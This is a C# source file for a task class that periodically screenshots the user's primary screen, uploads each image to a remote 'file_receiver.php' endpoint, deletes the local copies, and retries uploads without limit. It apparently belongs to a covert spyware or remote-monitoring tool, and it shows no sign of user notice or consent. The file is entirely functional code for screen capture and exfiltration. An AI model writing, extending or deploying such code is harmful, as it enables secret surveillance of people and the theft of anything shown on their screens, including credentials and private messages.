using System;
using System.IO;
using System.Windows.Forms;
using System.Drawing;
using System.Threading;

namespace IDK {

    /// <summary>
    /// Takes screenshots and sends them to the server
    /// </summary>
    class ScreenshotTask : Task {

        // instance of the class that takes screenshots
        private Screenshot Screenshot;

        // directory in which screenshots are saved
        private const string SCREENSHOT_DIRECTORY = "screenshots/";

        private const string BASE_FILE_NAME = "SCREENSHOT_";

        /// <summary>
        /// Class constructor
        /// </summary>
        public ScreenshotTask() : base(Config.GetInstance().Settings.SCREENSHOT_INTERVAL) { }

        /// <summary>
        /// Gets called before the task starts executing to perform required initialization
        /// </summary>
        public override void Initialize() {
            DirectoryInfo info = new DirectoryInfo(SCREENSHOT_DIRECTORY);

            if (!info.Exists) {
                info.Create();
            }

            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Screenshot = new Screenshot(bounds.Width, bounds.Height);
        }

        /// <summary>
        /// Gets called periodically when screenshots need to be taken
        /// </summary>
        public override void Update() {
            TakeScreenshot(null);
            UploadScreenshots();
        }

        /// <summary>
        /// Uploads all taken screenshots to the server
        /// </summary>
        private void UploadScreenshots() {
            FileInfo[] files = new DirectoryInfo(SCREENSHOT_DIRECTORY).GetFiles();

            foreach (FileInfo file in files) {
                if (file.Name.Contains(BASE_FILE_NAME) && file.Extension.ToLower().Equals(".png")) {
                    UploadScreenshot(SCREENSHOT_DIRECTORY + file.Name);
                }
                
                file.Delete();
            }
        }

        /// <summary>
        /// Uploads a single screenshot to the server
        /// </summary>
        /// <param name="file">file name of the screenshot to upload</param>
        private void UploadScreenshot(string file) {
            try {
                Network.UploadFile(Config.SERVER_BASE_URL + "file_receiver.php", file);
            } catch {
                Thread.Sleep(Config.CONNECTION_DELAY);
                UploadScreenshot(file);
            }
        }

        /// <summary>
        /// Takes a screenshot and saves it to the screenshots folder
        /// <param name="nameExtra">extra information to insert into the file name, can be null</param>
        /// </summary>
        public void TakeScreenshot(string nameExtra) {
            Bitmap screenshot = Screenshot.Take();
            DateTime now = DateTime.Now;
            screenshot.Save(SCREENSHOT_DIRECTORY + BASE_FILE_NAME + now.Year + "_" + now.Month + "_" + now.Day + "_" + now.Hour + 
                "_" + now.Minute + "_" + now.Second + "_" + now.Millisecond +
                (ReferenceEquals(nameExtra, null) ? "" : "_" + nameExtra) + ".png");
        }

        /// <summary>
        /// Overrides base Stop() method. Disposes of the screenshot object
        /// </summary>
        public override void Stop() {
            base.Stop();
            Screenshot.Dispose();
        }
    }
}
